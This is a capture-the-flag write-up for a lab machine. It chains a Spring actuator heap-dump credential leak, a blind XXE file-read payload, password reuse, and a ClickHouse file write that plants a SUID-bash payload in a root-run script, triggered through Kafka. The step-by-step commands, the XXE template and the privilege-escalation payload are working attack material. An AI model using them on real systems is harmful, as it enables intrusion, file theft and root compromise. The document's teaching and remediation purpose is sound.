Summary

Stream is an airport-themed data-pipeline machine built around three loosely-coupled services: an nginx virtual host, a FastAPI AIDX ingest endpoint on 8081, and a Spring Boot gateway exposing an unrestricted actuator heap dump. Parsing the heap dump recovers Hikari connection credentials for a ClickHouse database. The AIDX ingest feeds an XML pipeline whose parser resolves external entities (XXE); because parsed fields are persisted to a queryable ClickHouse table, the blind, asynchronous pipeline becomes a usable arbitrary-file-read channel. Reading Kafka's server.properties discloses an inline SASL credential (svc_infra) reused as the SSH password, yielding a foothold.

From there, a weak su password (tinkerbell) pivots to martin_cole, whose home holds a Kopia backup repository. Restoring a snapshot of ClickHouse logs surfaces the privileged default database password in a logged syntax-error. That admin account holds the FILE grant, allowing a malicious Python quarantine formatter to be written into ClickHouse's user_files directory via the file() table function. A root-owned systemd timer (aidx-dlq-drainer) executes that formatter against each dead-letter-queue message, so producing a single message to the unauthenticated Kafka DLQ topic triggers root code execution.

Initial Foothold / Initial Access

Vulnerability: Spring Actuator Heap Dump → ClickHouse Credentials

Description: The Spring Boot gateway exposes /actuator/heapdump without authentication. A heap dump is a snapshot of JVM memory that retains live objects — including the Hikari connection-pool credentials used to reach ClickHouse.

Gotcha — MTU: The heap dump download repeatedly stalled (connection reset, zero bytes). The cause was an MTU mismatch on the VPN tunnel: small requests succeeded but large transfers were silently dropped. Fixed with:

sudo ip link set dev tun0 mtu 1200

After this, the dump downloaded cleanly. (Lesson: on a VPN, if small requests work but large downloads hang/die — suspect MTU first.)

Steps:

# download the heap dump (after MTU fix)
curl -s http://api.htb-airport.htb/actuator/heapdump -o heapdump.hprof

# extract credentials
java -jar JDumpSpider.jar heapdump.hprof
# UserPassSearcher ->
#   com.zaxxer.hikari.util.Credentials:
#   [password = Yl4aCgh4y2PnU, username = svc_events]

Result: ClickHouse service credentials svc_events / Yl4aCgh4y2PnU.

XML submitted to /feeds/aidx is stored verbatim in flightleg_raw and parsed into structured columns in flightleg_json. The parse step is where the XXE fires — so flightleg_json becomes the read-back channel.

Vulnerability: Blind XXE via the AIDX pipeline

Description: The parser (aidx_common.py) builds the lxml parser with external-entity resolution enabled:

def _plain_parser():
    return etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)

The ingest only pattern-matches required substrings and forwards to Kafka; the downstream worker parses the XML (expanding entities) and persists the result. Entities resolve in element text (not attributes), and the parser reads originator from the Code attribute and airline from the <Airline> text — so placing the entity in <Airline> surfaces file contents in the airline column.

Steps:

A reusable helper to read any file (fresh flight number each time to avoid stale rows):

cat > /tmp/x.xml <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file://$1"> ]>
<ns0:IATA_AIDX_FlightLegNotifRQ xmlns:ns0="http://www.iata.org/IATA/2007/00" Version="22.1" TransactionStatusCode="Update">
  <ns0:Originator CompanyShortName="BAW" Code="ZZ" CodeContext="3"/>
  <ns0:FlightLeg><ns0:LegIdentifier>
    <ns0:Airline CodeContext="3">&xxe;</ns0:Airline>
    <ns0:FlightNumber>$2</ns0:FlightNumber>
  </ns0:LegIdentifier></ns0:FlightLeg>
</ns0:IATA_AIDX_FlightLegNotifRQ>

curl -s -X POST http://htb-airport.htb:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary @/tmp/x.xml -w " [%{http_code}]\n"

Vulnerability: Root-Executed Quarantine Formatter (Arbitrary File Write Trust Boundary)

Description: /opt/ops/dlq_drainer.py runs as root (via aidx-dlq-drainer.service, Type=oneshot, on a ~2-minute timer). For each dead-letter-queue message it executes a formatter script as root:

FORMATTER = "/var/lib/clickhouse/user_files/aidx_quarantine.py"
...
subprocess.run(["python3", FORMATTER], input=raw, capture_output=True, check=False)

That formatter lives in ClickHouse's user_files directory — writable by the default user through the file() table function. A database admin can therefore replace a script that root later executes: a complete trust-boundary failure.

Steps:

# 1) overwrite the formatter with a root payload (SUID bash)
#    engine_file_truncate_on_insert=1 => overwrite instead of append
clickhouse client --user default --password 'N3v3rs33nD4T4' --query \
"INSERT INTO FUNCTION file('aidx_quarantine.py', 'LineAsString', 'line String') \
 SETTINGS engine_file_truncate_on_insert=1 \
 VALUES ('import os'), ('os.system(\"cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\")')"

# verify the written formatter
clickhouse client --user default --password 'N3v3rs33nD4T4' --query \
"SELECT * FROM file('aidx_quarantine.py', 'LineAsString')"
# import os
# os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")

# 2) trigger the drainer: produce a message to the unauthenticated DLQ topic
echo '<trigger/>' | /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh \
  --bootstrap-server 127.0.0.1:9092 \
  --topic aidx.flightleg.dlq.v1 \

Takeaways / Remediation

  • Restrict actuator endpoints and treat heap dumps as highly sensitive — they retain live secrets.
  • Disable external entity resolution (resolve_entities=False, no_network=True) in XML parsers unless explicitly required.
  • Never store credentials inline in config files, and never reuse a service credential as an interactive login password.
  • Protect backups and logs as carefully as application secrets — historic records leak valid credentials.
  • A root service must never execute content from a path writable by a lower-privileged account. The formatter should be root-owned, immutable to the database, and validated before execution.
  • Enforce strong passwords on all interactive accounts.
